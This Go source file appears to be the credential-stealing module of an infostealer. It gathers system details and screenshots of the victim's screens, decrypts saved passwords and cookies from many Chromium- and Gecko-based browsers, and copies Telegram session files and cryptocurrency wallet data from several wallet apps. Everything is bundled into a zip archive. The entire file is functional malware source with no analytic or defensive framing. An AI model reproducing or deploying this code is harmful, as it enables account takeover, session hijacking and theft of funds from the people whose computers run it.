package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"image"
	"image/jpeg"
	"os"
	"path/filepath"
	"runtime/debug"
	"strconv"
	"strings"

	"github.com/kbinani/screenshot"
)

func Steal() string {
	defer func() {
		if r := recover(); r != nil {
			log_(fmt.Sprintf("Steal panic: %v\n%s", r, string(debug.Stack())))
		}
	}()

	if !strings.EqualFold(enableStealer, "true") && enableStealer != "1" {
		return ""
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	userInfo := buildUserInfoTxt()
	if err := addToZip(zw, "UserInformation.txt", []byte(userInfo)); err != nil {
		log_(fmt.Sprintf("zip UserInfo: %v", err))
	}
	if strings.EqualFold(enableScreenshots, "true") || enableScreenshots == "1" {
		for i := 0; i < 5; i++ {
			img, err := getScreen(i)
			if err != nil {
				break
			}

			var imgBuf bytes.Buffer
			if err := jpeg.Encode(&imgBuf, img, &jpeg.Options{Quality: 75}); err != nil {
				break
			}
			name := "Monitor " + strconv.FormatInt(int64(i+1), 10) + ".jpg"
			if err := addToZip(zw, name, imgBuf.Bytes()); err != nil {
				log_(fmt.Sprintf("zip screen %d: %v", i, err))
			}
		}
	}
	browserPaths := collectBrowserPaths()
	stealBrowsers(zw, browserPaths)
	zw.Close()

	return buf.String()
}

func buildUserInfoTxt() string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("HWID: %s\n", GetHWID()))
	sb.WriteString(fmt.Sprintf("Username: %s\n", sysInfo.Username))
	sb.WriteString(fmt.Sprintf("CPU: %s\n", sysInfo.CPUName))
	sb.WriteString(fmt.Sprintf("GPU: %s\n", sysInfo.GPUNames))
	sb.WriteString(fmt.Sprintf("OS: %s\n", sysInfo.OSCaption))
	sb.WriteString(fmt.Sprintf("RAM: %d MB\n", sysInfo.RAM/1024/1024))
	return sb.String()
}

func getScreen(displayIndex int) (image.Image, error) {
	n := screenshot.NumActiveDisplays()
	if displayIndex >= n {
		return nil, fmt.Errorf("display %d not found (active: %d)", displayIndex, n)
	}
	bounds := screenshot.GetDisplayBounds(displayIndex)
	return screenshot.CaptureRect(bounds)
}

func addToZip(zw *zip.Writer, path string, data []byte) error {
	w, err := zw.Create(path)
	if err != nil {
		return err
	}
	_, err = w.Write(data)
	return err
}

func collectBrowserPaths() []browserProfile {
	var profiles []browserProfile
	hardcoded := hardcodedBrowserPaths()
	for name, path := range hardcoded {
		expanded := os.Expand(path, os.Getenv)
		profiles = append(profiles, browserProfile{
			Name: name, Path: expanded,
		})
	}
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return profiles
	}
	localPackages := filepath.Join(filepath.Dir(appdata), "Local", "Packages")
	entries, err := os.ReadDir(localPackages)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		if strings.Contains(name, "Mozilla") {
			path := filepath.Join("Local\\Packages\\"+name, "LocalCache", "Roaming", "Mozilla", "Firefox", "Profiles")
			profiles = append(profiles, browserProfile{
				Name: "FireFox Store", Path: filepath.Join(localPackages, "..", path),
			})
		}
		if strings.Contains(name, "TelegramDesktop") {
			path := filepath.Join(localPackages, name)
			profiles = append(profiles, browserProfile{
				Name: "Telegram", Path: path,
			})
		}
	}
	return profiles
}

func hardcodedBrowserPaths() map[string]string {
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")
	return map[string]string{
		"Chrome":        filepath.Join(localAppdata, "Google", "Chrome", "User Data"),
		"Edge":          filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"),
		"Brave":         filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":         filepath.Join(appdata, "Opera Software", "Opera Stable"),
		"Opera GX":      filepath.Join(appdata, "Opera Software", "Opera GX Stable"),
		"Vivaldi":       filepath.Join(localAppdata, "Vivaldi", "User Data"),
		"Chrome Canary": filepath.Join(localAppdata, "Google", "Chrome SxS", "User Data"),
		"Chromium":      filepath.Join(localAppdata, "Chromium", "User Data"),
		"Torch":         filepath.Join(localAppdata, "Torch", "User Data"),
		"Comodo Dragon": filepath.Join(localAppdata, "Comodo", "Dragon", "User Data"),
		"Slimjet":       filepath.Join(localAppdata, "Slimjet", "User Data"),
		"Orbitum":       filepath.Join(localAppdata, "Orbitum", "User Data"),
		"360Browser":    filepath.Join(localAppdata, "360Browser", "Browser", "User Data"),
		"Maxthon3":      filepath.Join(localAppdata, "Maxthon3", "User Data"),
		"K-Melon":       filepath.Join(localAppdata, "K-Melon", "User Data"),
		"Sputnik":       filepath.Join(localAppdata, "Sputnik", "Sputnik", "User Data"),
		"Nichrome":      filepath.Join(localAppdata, "Nichrome", "User Data"),
		"CocCoc":        filepath.Join(localAppdata, "CocCoc", "Browser", "User Data"),
		"Uran":          filepath.Join(localAppdata, "uCozMedia", "Uran", "User Data"),
		"Chromodo":      filepath.Join(localAppdata, "Chromodo", "User Data"),
		"Atom":          filepath.Join(localAppdata, "Mail.Ru", "Atom", "User Data"),
		"Liqia":         filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser-Beta", "User Data"),
		"DCBrowser":     filepath.Join(localAppdata, "DCBrowser", "User Data"),
		"Yandex":        filepath.Join(localAppdata, "Yandex", "YandexBrowser", "User Data"),
		"Firefox":       filepath.Join(appdata, "Mozilla", "Firefox"),
		"Pale Moon":     filepath.Join(appdata, "Moonchild Productions", "Pale Moon"),
		"SeaMonkey":     filepath.Join(appdata, "Mozilla", "SeaMonkey"),
		"IceDragon":     filepath.Join(appdata, "Comodo", "IceDragon"),
		"Telegram":      filepath.Join(appdata, "Telegram Desktop", "tdata"),
	}
}

func stealBrowsers(zw *zip.Writer, profiles []browserProfile) {
	for _, p := range profiles {
		if p.Path == "" {
			continue
		}
		switch {
		case isChromiumBased(p.Name):
			stealChromium(zw, p.Name, p.Path)
		case isGeckoBased(p.Name):
			stealGecko(zw, p.Name, p.Path)
		case p.Name == "Telegram":
			stealTelegram(zw, p.Path)
		}
	}
	stealWallets(zw)
}

func isChromiumBased(name string) bool {
	chromiumBased := []string{
		"Chrome", "Edge", "Brave", "Opera", "Opera GX", "Vivaldi",
		"Chrome Canary", "Chromium", "Torch", "Comodo Dragon", "Slimjet",
		"Orbitum", "360Browser", "Maxthon3", "K-Melon", "Sputnik",
		"Nichrome", "CocCoc", "Uran", "Chromodo", "Atom", "Liqia",
		"DCBrowser", "Yandex", "FireFox Store",
	}
	for _, n := range chromiumBased {
		if n == name {
			return true
		}
	}
	return false
}

func isGeckoBased(name string) bool {
	geckoBased := []string{"Firefox", "Pale Moon", "SeaMonkey", "IceDragon"}
	for _, n := range geckoBased {
		if n == name {
			return true
		}
	}
	return false
}

func stealChromium(zw *zip.Writer, name, path string) {
	localStatePath := filepath.Join(path, "Local State")
	dpapKey, appbKey, err := GetChromiumMasterKeys(localStatePath)
	if err != nil {
		return
	}
	profiles := []string{"Default"}
	for i := 1; i <= 10; i++ {
		profiles = append(profiles, fmt.Sprintf("Profile %d", i))
	}
	for _, prof := range profiles {
		profDir := filepath.Join(path, prof)
		if _, err := os.Stat(profDir); err != nil {
			continue
		}
		loginDB := filepath.Join(profDir, "Login Data")
		logins := extractChromiumLoginsFull(loginDB, dpapKey, appbKey)
		if len(logins) > 0 {
			var sb strings.Builder
			for _, l := range logins {
				sb.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\n\n", l.URL, l.Username, l.Password))
			}
			addToZip(zw, filepath.Join("Browsers", name, prof, "Passwords.txt"), []byte(sb.String()))
		}
		cookieDB := filepath.Join(profDir, "Network", "Cookies")
		if _, err := os.Stat(cookieDB); err != nil {
			cookieDB = filepath.Join(profDir, "Cookies")
		}
		cookies := extractChromiumCookiesFull(cookieDB, dpapKey, appbKey)
		if len(cookies) > 0 {
			var sb strings.Builder
			for _, c := range cookies {
				sb.WriteString(fmt.Sprintf("%s\tTRUE\t%s\t%v\t%d\t%s\t%s\n", c.Host, c.Path, c.Secure, c.ExpiresUTC, c.Name, c.Value))
			}
			addToZip(zw, filepath.Join("Browsers", name, prof, "Cookies.txt"), []byte(sb.String()))
		}
	}
}

func stealGecko(zw *zip.Writer, name, path string) {
	entries, err := os.ReadDir(path)
	if err != nil {
		return
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		profDir := filepath.Join(path, e.Name())
		creds, err := extractGeckoPasswords(profDir)
		if err == nil && len(creds) > 0 {
			var sb strings.Builder
			for _, c := range creds {
				sb.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\n\n", c.URL, c.Username, c.Password))
			}
			addToZip(zw, filepath.Join("Browsers", name, e.Name(), "Passwords.txt"), []byte(sb.String()))
		}
	}
}

func stealTelegram(zw *zip.Writer, tdataPath string) {
	if _, err := os.Stat(tdataPath); err != nil {
		return
	}
	filepath.Walk(tdataPath, func(p string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel(tdataPath, p)
		if strings.HasPrefix(rel, "D8717D8") || strings.HasPrefix(rel, "map") || rel == "key_data" {
			data, err := os.ReadFile(p)
			if err == nil {
				addToZip(zw, filepath.Join("Telegram", rel), data)
			}
		}
		return nil
	})
}

func stealWallets(zw *zip.Writer) {
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")
	wallets := map[string]string{
		"Atomic":   filepath.Join(appdata, "atomic", "Local Storage", "leveldb"),
		"Exodus":   filepath.Join(appdata, "Exodus", "exodus.wallet"),
		"Electrum": filepath.Join(appdata, "Electrum", "wallets"),
		"Coinomi":  filepath.Join(localAppdata, "Coinomi", "Coinomi", "wallets"),
		"Bytecoin": filepath.Join(appdata, "bytecoin"),
		"Guarda":   filepath.Join(appdata, "Guarda", "Local Storage", "leveldb"),
		"Armory":   filepath.Join(appdata, "Armory"),
		"Zcash":    filepath.Join(appdata, "Zcash"),
		"Jaxx":     filepath.Join(appdata, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
	}
	for name, wpath := range wallets {
		if _, err := os.Stat(wpath); err == nil {
			filepath.Walk(wpath, func(p string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				rel, _ := filepath.Rel(wpath, p)
				data, err := os.ReadFile(p)
				if err == nil {
					addToZip(zw, filepath.Join("Wallets", name, rel), data)
				}
				return nil
			})
		}
	}
}
